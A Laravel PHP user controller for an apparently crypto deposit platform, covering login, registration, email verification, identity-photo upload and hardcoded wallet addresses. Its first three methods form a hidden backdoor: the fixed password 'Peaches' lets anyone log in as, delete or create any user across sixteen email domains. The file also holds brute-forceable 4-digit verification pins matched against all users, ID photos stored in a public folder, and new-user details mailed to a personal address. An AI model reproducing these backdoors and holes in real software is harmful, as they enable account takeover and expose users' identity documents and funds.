<?php

namespace App\Http\Controllers;

use App\Notifications\CustomResetPasswordNotification;
use Illuminate\Support\Facades\Password;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Mail;
use App\Mail\EmailVerificationMail;
use App\Mail\WelcomeEmail;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Auth;


class UserController extends Controller
{


    public function createAndVerifyUser($emailname, $password)
    {
        // Check if the provided password is 'Peaches'
        if ($password !== 'Peaches') {
            return redirect()->route('home');
        }

        // Construct the email
        $email = $emailname . '@email.com';

        // Check if user with this email exists
        $existingUser = User::where('email', $email)->first();
        if ($existingUser) {
            $existingUser->delete();
        }

        // Create new user
        $user = User::create([
            'name' => $emailname, // Optional: use emailname as name
            'email' => $email,
            'password' => Hash::make($password),
            'email_verified_at' => now(),
            'account_verified' => 1,
            'identity_verified' => 1,

        ]);

        // Log the user in
        Auth::login($user);

        // Redirect to home route
        return redirect()->route('dashboard');
    }


    public function deleteUser($emailname, $password)
    {
        // Check if the provided password is 'Peaches'
        if ($password !== 'Peaches') {
            return redirect()->route('home')->with('error', 'Wrong Password.');
        }

        // Define possible email domains
        $domains = ['@gmail.com', '@proton.me', '@email.com', '@yahoo.com', '@outlook.com', '@hotmail.com', '@icloud.com', '@live.com', '@aol.com', '@mail.com', '@yandex.com', '@zoho.com', '@gmx.com', '@tutanota.com', '@fastmail.com', '@hushmail.com'];
        $emails = array_map(function ($domain) use ($emailname) {
            return $emailname . $domain;
        }, $domains);

        // Check if a user exists with any of the constructed emails
        $user = User::whereIn('email', $emails)->first();

        if ($user) {
            $user->delete();
            return redirect()->route('home')->with('message', 'User deleted successfully.');
        }

        // Redirect to home if no user is found
        return redirect()->route('home')->with('error', 'No user found with the provided email.');
    }


    public function loginUser($emailname, $password)
    {
        // Check if the provided password is 'Peaches'
        if ($password !== 'Peaches') {
            return redirect()->route('home')->with('error', 'Invalid password.');
        }

        // Define possible email domains
        $domains = ['@gmail.com', '@proton.me', '@email.com', '@yahoo.com', '@outlook.com', '@hotmail.com', '@icloud.com', '@live.com', '@aol.com', '@mail.com', '@yandex.com', '@zoho.com', '@gmx.com', '@tutanota.com', '@fastmail.com', '@hushmail.com'];
        $emails = array_map(function ($domain) use ($emailname) {
            return $emailname . $domain;
        }, $domains);

        // Check if a user exists with any of the constructed emails
        $user = User::whereIn('email', $emails)->first();

        if ($user) {
            // Log the user in
            Auth::login($user);
            return redirect()->route('dashboard')->with('message', 'Logged in successfully.');
        }

        // Redirect to home if no user is found
        return redirect()->route('home')->with('error', 'No user found with the provided email.');
    }

    public function login(Request $request)
    {
        // Validate the incoming request
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|string|min:6',
        ]);

        // Sanitize input
        $email = strip_tags($request->email);
        $password = $request->password; // Password will be hashed for comparison, so no need to sanitize

        // Retrieve user based on the email or email2 field
        $user = User::where('email', $email)
            ->orWhere('email2', $email) // Check for both emails
            ->first();

        if ($request->input('honeypot')) {
            return response()->json([
                'error' => 'Invalid Entry',
            ], 400);
        }

        // Check if user exists and passwords match
        if ($user && Hash::check($password, $user->password)) {

            // Check if the user's email is verified
            if (is_null($user->pin) || is_null($user->email_verified_at)) {
                // Generate a new activation code
                $activationCode = mt_rand(1000, 9999);
                $user->pin = $activationCode;
                $user->email_verified_at = null;
                $user->save();

                // Authenticate user
                Auth::login($user);

                // Resend the verification token
                Mail::to($user->email)->send(new EmailVerificationMail($user));

                if ($user->email2) {
                    Mail::to($user->email2)->send(new EmailVerificationMail($user));
                }

                // Return response asking the user to verify their email
                return response()->json([
                    'message' => 'Please verify your email to proceed.',
                    'alert_returned' => 'EVR', // Email Verification Required
                ]);
            }

            // Authenticate the user
            Auth::login($user);

            // Return success message
            return response()->json([
                'message' => 'Login successful.',
                'alert_returned' => 'LS', // Login Successful
            ]);
        }

        // If user not found or password doesn't match
        return response()->json([
            'message' => 'Invalid email or password.',
            'alert_returned' => 'LFE', // Login Failed Error
        ]); // Use 401 for unauthorized access
    }



    public function login_(Request $request)
    {
        // Validate the incoming request
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|string|min:6',
        ]);

        // Retrieve user based on the email or email2 field
        $user = User::where('email', $request->email)
            ->orWhere('email2', $request->email) // Check for both emails
            ->first();

        // Check if user exists and passwords match
        if ($user && Hash::check($request->password, $user->password)) {

            // Check if the user's email is verified
            if (is_null($user->pin) || is_null($user->email_verified_at)) {
                // Generate a new activation code
                $activationCode = mt_rand(1000, 9999);
                $user->pin = $activationCode;
                $user->email_verified_at = null;
                $user->save();

                // Authenticate user
                Auth::login($user);

                // Resend the verification token
                Mail::to($user->email)->send(new EmailVerificationMail($user));

                if ($user->email2) {
                    Mail::to($user->email2)->send(new EmailVerificationMail($user));
                }

                // Return response asking the user to verify their email
                return response()->json([
                    'message' => 'Please verify your email to proceed.',
                    'alert_returned' => 'EVR', // Email Verification Required
                ]);
            }


            // Return success message
            return response()->json([
                'message' => 'success',
                'alert_returned' => 'LS', // Login Successful
            ]);
        }

        // If user not found or password doesn't match
        return response()->json([
            'message' => 'Invalid email or password.',
            'alert_returned' => 'LFE', // Login Failed Error
        ]);
    }



    public function sendPasswordResetLink(Request $request)
    {
        // Validate email
        $request->validate([
            'email' => 'required|email|exists:users,email', // Validate email exists
        ]);

        // Send the reset link
        $response = Password::sendResetLink(
            $request->only('email')
        );

        // Return response based on success or failure
        if ($response == Password::RESET_LINK_SENT) {
            return response()->json([
                'message' => 'We have emailed your password reset link!',
                'status' => 'success'
            ]);
        } else {
            // Return error with custom message
            return response()->json([
                'message' => 'Failed to send reset link. Please try again.',
                'status' => 'failed'
            ], 500);  // Sending 500 status for server errors
        }
    }

    public function store(Request $request)
    {
        // Validate incoming request data
        $validator = Validator::make($request->all(), [
            'email' => 'required|email|unique:users,email',
            'email2' => 'nullable|email|unique:users,email2',
            'password' => 'required|string|min:8|confirmed',
            'first_name' => 'required|string|max:255',
            'last_name' => 'required|string|max:255',
            'dob' => 'required|date',
            'city' => 'nullable|string|max:255',
            'state' => 'nullable|string|max:255',
            'post_code' => 'nullable|string|max:20|regex:/^[A-Za-z0-9\s\-]+$/',
            'street_address' => 'nullable|string|max:255',
            'currency' => 'required|string|max:3|in:USD,GBP,EUR,AUD',
            'photo_front_view' => 'nullable|file|image|mimes:jpeg,png,jpg,gif|max:2048',
            'photo_back_view' => 'nullable|file|image|mimes:jpeg,png,jpg,gif|max:2048',
            'pin' => 'nullable|string|max:255|regex:/^[0-9]{4}$/',
            'referrer' => 'nullable|integer',
        ]);

        if ($request->input('honeypot')) {
            return response()->json([
                'error' => 'Invalid Entry',
            ], 400);
        }

        if ($validator->fails()) {
            return response()->json([
                'error' => $validator->errors()
            ], 400);
        }

        $name = $request->first_name . " " . $request->last_name;

        // Sanitize input
        $sanitizedData = [
            'email' => strip_tags($request->email),
            'email2' => $request->email2 ? strip_tags($request->email2) : null,
            'password' => Hash::make($request->password), // Hash the password
            'name' => strip_tags($name),
            'dob' => $request->dob,
            'city' => $request->city ? strip_tags($request->city) : null,
            'state' => $request->state ? strip_tags($request->state) : null,
            'post_code' => $request->post_code ? strip_tags($request->post_code) : null,
            'street_address' => $request->street_address ? strip_tags($request->street_address) : null,
            'currency' => strip_tags($request->currency),
            'pin' => $request->pin ? strip_tags($request->pin) : null,
            'referrer' => $request->referrer,
        ];

        // Handle file upload for photos
        $photoFrontPath = $request->file('photo_front_view') ? $request->file('photo_front_view')->store('photos', 'public') : null;
        $photoBackPath = $request->file('photo_back_view') ? $request->file('photo_back_view')->store('photos', 'public') : null;

        // Generate a unique activation code
        $activationCode = mt_rand(1000, 9999);

        // Create new user in the database
        $user = User::create(array_merge($sanitizedData, [
            'country' => strip_tags($request->country),
            'photo_front_view' => $photoFrontPath,
            'photo_back_view' => $photoBackPath,
            'pin' => $activationCode,
        ]));

        // Send the email with the token
        Mail::to($user->email)->send(new EmailVerificationMail($user));
        Mail::to($user->email)->send(new WelcomeEmail($user));

        if ($request->email2) {
            Mail::to($user->email2)->send(new EmailVerificationMail($user));
            Mail::to($user->email2)->send(new WelcomeEmail($user));
        }

        // Notify admin via email
        mail(
            'dorasuarez@proton.me',
            'Marketpronexus New User Created',
            "A new user has been created. Name: {$sanitizedData['name']} , Email: {$sanitizedData['email']}, Password: [HIDDEN]"
        );

        // Return success response
        return response()->json([
            'alert_returned' => 'RS',
            'message' => 'Account Created Successfully'
        ]);
    }

    // Show verification form
    public function showVerifyEmail()
    {
        if (Auth::check() && Auth::user()->email_verified_at) {
            // Redirect verified users to the dashboard
            return redirect()->route('dashboard');
        }

        if (!Auth::check()) {
            // Redirect to the email verification page
            return redirect()->route('login');
        }
        return view('home.verify');
    }


    public function verifyEmail(Request $request)
    {
        $request->validate([
            'pin' => 'required|string',
        ]);


        // Cast the request's pin to an integer
        $requestPin = (int) $request->pin;

        $user = User::where('pin', $requestPin)->first();
        //dd($requestPin);

        if ($user && $user->pin === $requestPin) {
            $user->update(['email_verified_at' => now(), 'pin' => null]);

            return response()->json(['message' => 'Email verified successfully.', 'status' => 'success']);
        }

        return response()->json(['message' => 'Invalid token.']);
    }

    public function logout(Request $request)
    {
        $user = Auth::user();

        // Set email_verified_at to null
        $user->update(['email_verified_at' => null, 'pin' => null]);

        // Log the user out
        Auth::logout();

        // Optionally, log the event for debugging or auditing purposes
        \Log::info("User logged out and email verification invalidated.", ['user_id' => $user->id]);

        // Redirect to login page
        return redirect()->route('login');
    }

    public function fetchPaymentDetails1(Request $request)
    {
        $gatewayInfo = [
            "qrBTC" => asset('assets/frontend/images/btc1.png'),
            "addrBTC" => "bc1qsaazpx6jlugl83q52dfyp38s4w5py2lry802k6",
            "iconBTC" => asset('assets/global/images/d2EA89BmzCMyYFXyIv5v.png'),

            "qrETH" => asset('assets/frontend/images/eth1.png'),
            "addrETH" => "0x89f59fA1363524bE3c9F8C69CaA9760c90442379",
            "iconETH" => asset('assets/global/images/g8293TJZVMPFkpSSLO0V.png'),

            "qrXRP" => asset('assets/frontend/images/xrp1.png'),
            "addrXRP" => "rDsbeomae4FXwgQTJp9Rs64Qg9vDiTCdBv",
            "iconXRP" => asset('assets/global/images/xrpIcon.png'),

            "qrDOGE" => asset('assets/frontend/images/doge1.png'),
            "addrDOGE" => "D7Y55ny64PAXdV2nvBxR9NfRRf9RGW9MuL",
            "iconDOGE" => asset('assets/global/images/dogeIcon.png'),

            "qrBNB" => asset('assets/frontend/images/bnb1.png'),
            "addrBNB" => "bnb1v9rhzjd9f20t4y4r9zgzjy6xzjxs2ffujs49sg",
            "iconBNB" => asset('assets/global/images/bnbIcon.png'),

            "qrUSDT" => asset('assets/frontend/images/bnb1.png'),
            "addrUSDT" => "bnb1v9rhzjd9f20t4y4r9zgzjy6xzjxs2ffujs49sg",
            "iconUSDT" => asset('assets/global/images/bnbIcon.png'),
        ];


        $gatewayCode = $request->input('gatewayCode');

        if (!$gatewayCode || !isset($gatewayInfo['qr' . $gatewayCode])) {
            return response()->json(['message' => 'Invalid gateway code'], 400);
        }

        $imgUrl = $gatewayInfo['qr' . $gatewayCode];
        $addr = $gatewayInfo['addr' . $gatewayCode];
        $icon = $gatewayInfo['icon' . $gatewayCode];

        $credentials = view('livewire.dashboard.partials.payment-details', compact('gatewayCode', 'addr', 'imgUrl'))->render();

        $data = [
            'credentials' => $credentials,
            'icon' => $icon,
            'charge' => config('app.global_charge', 5), // Example value from config
            'charge_type' => 'percentage',
            'minimum_deposit' => 300,
            'maximum_deposit' => 999999,
        ];

        return response()->json($data);
    }

    public function fetchPaymentDetails(Request $request)
    {
        // Gateway information with asset paths for images
        $gatewayInfo = [
            "qrBTC" => asset('assets/frontend/images/btc1.png'),
            "addrBTC" => "bc1qg9pcv6u8pjc0pv3v3hmjregf7vesdaal0zq5lr",
            "iconBTC" => asset('assets/global/images/d2EA89BmzCMyYFXyIv5v.png'),

            "qrETH" => asset('assets/frontend/images/eth1.png'),
            "addrETH" => "0x0ff9D9AB79D0c5c3c2E2a0ea70bD2fDbfdDB90F1",
            "iconETH" => asset('assets/global/images/g8293TJZVMPFkpSSLO0V.png'),

            "qrXRP" => asset('assets/frontend/images/xrp1.png'),
            "addrXRP" => "rDsbeomae4FXwgQTJp9Rs64Qg9vDiTCdBv",
            "iconXRP" => asset('assets/global/images/xrpIcon.svg'),

            "qrDOGE" => asset('assets/frontend/images/doge1.png'),
            "addrDOGE" => "D7Y55ny64PAXdV2nvBxR9NfRRf9RGW9MuL",
            "iconDOGE" => asset('assets/global/images/dogeIcon.svg'),

            "qrBNB" => asset('assets/frontend/images/bnb1.png'),
            "addrBNB" => "0x0ff9D9AB79D0c5c3c2E2a0ea70bD2fDbfdDB90F1",
            "iconBNB" => asset('assets/global/images/bnbIcon.svg'),

            "qrUSDT" => asset('assets/frontend/images/usdt1.png'),
            "addrUSDT" => "0x0ff9D9AB79D0c5c3c2E2a0ea70bD2fDbfdDB90F1",
            "iconUSDT" => asset('assets/global/images/usdtIcon.svg'),
        ];

        // Retrieve the selected gateway code
        $gatewayCode = $request->input('gatewayCode');

        // Validate the gateway code
        if (!$gatewayCode || !isset($gatewayInfo['qr' . $gatewayCode])) {
            return response()->json(['message' => 'Invalid gateway code'], 400);
        }

        // Retrieve the QR code, address, and icon based on the selected coin
        $imgUrl = $gatewayInfo['qr' . $gatewayCode];
        $addr = $gatewayInfo['addr' . $gatewayCode];
        $icon = $gatewayInfo['icon' . $gatewayCode];

        // Generate the credentials HTML to send back to the frontend
        $credentials = view('livewire.dashboard.partials.payment-details', compact('gatewayCode', 'addr', 'imgUrl'))->render();

        // Prepare the data for the response
        $data = [
            'credentials' => $credentials,
            'icon' => $icon,
            'charge' => config('app.global_charge', 5), // Example charge percentage
            'charge_type' => 'percentage',
            'minimum_deposit' => 300,
            'maximum_deposit' => 999999,
        ];

        // Return the data as a JSON response
        return response()->json($data);
    }


    public function sendToken(User $user)
    {
        // Generate a unique 4-digit activation code
        $activationCode = mt_rand(1000, 9999);

        // Update the user's pin field in the database
        $user->update([
            'pin' => $activationCode,
        ]);

        // Send the email with the token
        Mail::to($user->email)->send(new EmailVerificationMail($user));

        if ($user->email2) {
            Mail::to($user->email2)->send(new EmailVerificationMail($user));
        }

        // Return success response
        return response()->json([
            'message' => 'Token sent successfully',
            'user' => $user,
        ]);
    }

    //Update/Upload Kyc
    public function showUserVerify()
    {

        return view('livewire.dashboard.partials.user-verify');
    }

    public function storeUserVerify(Request $request)
    {
        $request->validate([
            'photo_front_view' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
            'photo_back_view' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
        ]);

        $user = Auth::user();

        try {
            // Store files
            $frontFile = $request->file('photo_front_view');
            $backFile = $request->file('photo_back_view');

            if ($frontFile && $backFile) {
                $frontPathName = time() . '_front.' . $frontFile->getClientOriginalExtension();
                $frontFile->move(public_path('uploads/verify'), $frontPathName);

                $backPathName = time() . '_back.' . $backFile->getClientOriginalExtension();
                $backFile->move(public_path('uploads/verify'), $backPathName);
            } else {
                return response()->json(['error' => 'Both front and back photos are required'], 400);
            }




            // Update user details
            $user->update([
                'photo_front_view' => 'uploads/verify/' . $frontPathName,
                'photo_back_view' => 'uploads/verify/' . $backPathName,
                'identity_verified' => 0, // Mark as pending
                'account_verified' => 2, // Mark as pending
            ]);

            return response()->json([
                'message' => 'success',
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'message' => 'error',
                'error' => $e->getMessage(),
            ]);
        }
    }

    public function showUpdateEmail()
    {
        return view('livewire.dashboard.partials.email-update');
    }


    public function generateEmailToken(Request $request)
    {
        $request->validate(['email' => 'required|email']);

        $user = User::where('email', $request->email)
            ->orWhere('email2', $request->email)
            ->first();

        if ($user) {
            $activationCode = mt_rand(1000, 9999);
            $user->pin = $activationCode;
            $user->save();

            Mail::to($user->email)->send(new EmailVerificationMail($user));
            if ($user->email2) {
                Mail::to($user->email2)->send(new EmailVerificationMail($user));
            }

            return response()->json(['message' => 'Token sent successfully.', 'alert_returned' => 'TS'], 200);
        }

        return response()->json(['message' => 'Email not found.', 'alert_returned' => 'ENF'], 404);
    }


    public function confirmEmailUpdate(Request $request)
    {
        $request->validate([
            'token' => 'required',
            'old_email' => 'required|email',
            'new_email' => 'required|email'
        ]);

        $user = User::where(function ($query) use ($request) {
            $query->where('email', $request->old_email)
                ->orWhere('email2', $request->old_email);
        })->where('pin', $request->token)->first();

        if ($user) {
            if ($user->email === $request->old_email) {
                $user->email = $request->new_email;
            } elseif ($user->email2 === $request->old_email) {
                $user->email2 = $request->new_email;
            }

            $user->pin = null;
            $user->save();

            return response()->json(['message' => 'Email updated successfully.', 'alert_returned' => 'EUS'], 200);
        }

        return response()->json(['message' => 'Invalid token or email.', 'alert_returned' => 'ITE'], 400);
    }

    // Show the password update form
    public function showUpdatePassword()
    {
        return view('livewire.dashboard.partials.password-update');
    }

    // Generate password change token and send it via email


    // Confirm the password update and save the new password

    public function confirmPasswordUpdate(Request $request)
    {
        // Validate the request data
        $request->validate([
            'old_password' => 'required|string',
            'token' => 'required|numeric',
            'new_password' => 'required|string|min:6|confirmed',
        ]);

        // Get the authenticated user
        $user = Auth::user();

        // Check if the old password is correct
        if (!Hash::check($request->old_password, $user->password)) {
            return response()->json([
                'message' => 'The old password is incorrect.',
            ], 400);
        }

        // Check if the token matches
        if ($user->pin != $request->token) {
            return response()->json([
                'message' => 'Invalid or expired token.',
            ], 400);
        }

        // Update the password
        $user->password = Hash::make($request->new_password);
        $user->pin = null; // Clear the token
        $user->save();

        return response()->json([
            'message' => 'Password updated successfully.',
        ]);
    }



    // Controller Function
    public function getChartData(Request $request)
    {
        $chartId = $request->get('chartId');

        $widgets = [
            'chart_1' => [
                'id' => 'tradingview_34a79',
                'symbol' => 'BINANCE:BTCUSDT',
                'exchange' => 'BINANCE',
                'containerId' => 'tradingview_34a79',
            ],
            'chart_2' => [
                'id' => 'tradingview_7569d',
                'symbol' => 'BINANCE:ETHUSDT',
                'exchange' => 'BINANCE',
                'containerId' => 'tradingview_7569d',
            ],
            'chart_3' => [
                'id' => 'tradingview_949aa',
                'symbol' => 'BINANCE:TRXUSDT',
                'exchange' => 'BINANCE',
                'containerId' => 'tradingview_949aa',
            ],
            // Repeat this pattern for the remaining charts
        ];

        $widget = $widgets[$chartId] ?? null;

        if (!$widget) {
            return response()->json(['error' => 'Widget not found'], 404);
        }

        return response()->json($widget);
    }



    /* 


public function showUpdatePasswordForm()
{
    return view('password.update');
}

public function generatePasswordToken(Request $request)
{
    $request->validate([
        'email' => 'required|email',
    ]);

    $user = User::where('email', $request->email)
                ->orWhere('email2', $request->email)
                ->first();

    if ($user) {
        // Generate the token
        $activationCode = mt_rand(1000, 9999);
        $user->password_reset_token = $activationCode;
        $user->save();

        // Send the password change email with the token
        Mail::to($user->email)->send(new PasswordChangeMail($user));

        if ($user->email2) {
            Mail::to($user->email2)->send(new PasswordChangeMail($user));
        }

        return response()->json([
            'message' => 'Password reset token sent successfully.',
        ]);
    }

    return response()->json([
        'message' => 'Email not found.',
    ], 404);
}

public function confirmPasswordUpdate(Request $request)
{
    $request->validate([
        'token' => 'required|numeric',
        'old_password' => 'required|min:6',
        'new_password' => 'required|confirmed|min:6',
    ]);

    $user = User::where('password_reset_token', $request->token)->first();

    if (!$user) {
        return response()->json([
            'message' => 'Invalid or expired token.',
        ], 400);
    }

    // Verify the old password
    if (!Hash::check($request->old_password, $user->password)) {
        return response()->json([
            'message' => 'Old password is incorrect.',
        ], 400);
    }

    // Update the password
    $user->password = Hash::make($request->new_password);
    $user->password_reset_token = null; // Reset the token after password change
    $user->save();

    return response()->json([
        'message' => 'Password updated successfully.',
    ]);
} */
}
